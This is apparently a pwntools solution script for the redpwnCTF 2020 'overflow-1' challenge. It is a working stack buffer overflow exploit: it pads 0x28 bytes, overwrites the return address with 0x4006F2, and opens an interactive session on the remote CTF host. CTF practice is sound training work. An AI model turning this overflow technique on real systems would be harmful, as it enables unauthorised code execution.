from pwn import*

# io=process('./overflow-1')
io=remote("2020.redpwnc.tf",31255)
payload='a'*0x28+p64(0x4006F2)
io.recvuntil("coffer with?")
io.sendline(payload)
io.interactive()